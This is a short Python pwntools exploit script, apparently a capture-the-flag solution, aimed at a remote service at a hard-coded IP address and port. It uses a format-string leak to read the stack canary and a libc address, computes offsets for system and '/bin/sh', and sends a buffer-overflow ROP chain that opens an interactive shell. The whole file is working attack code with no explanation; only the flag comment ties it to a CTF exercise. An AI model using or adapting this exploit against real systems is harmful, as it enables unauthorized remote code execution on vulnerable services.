from pwn import *
import os


def exploit():
	io = remote("68.183.158.95", 8991)

	payload = "%11$p%13$p"
	io.sendline(payload)
	io.recvuntil("Hello\n")
	
	cookie = int(io.recv(18)[2:],16)
	libc_start_main = int(io.recv(14)[2:],16) - 0xf0

	log.info("canary {}".format(hex(cookie)))
	log.info("libc_start_main {}".format(hex(libc_start_main)))


	libc = libc_start_main - 0x0000000000020740
	system = libc + 0x0000000000045390
	binsh	= libc + 0x18cd57
	pop_rdi = libc + 0x0000000000021102

	assert libc & 0xfff == 0

	log.info("system {}".format(hex(system)))
	log.info("binsh {}".format(hex(binsh)))
	payload = 'A'*24
	payload += p64(cookie)
	payload += 'B'*8
	payload += p64(pop_rdi)
	payload += p64(binsh)
	payload += p64(system)
	payload += p64(system)
	io.sendline(payload)
	io.interactive()
	io.close()



exploit()
#d4rk{H3ll0_R0p}c0de
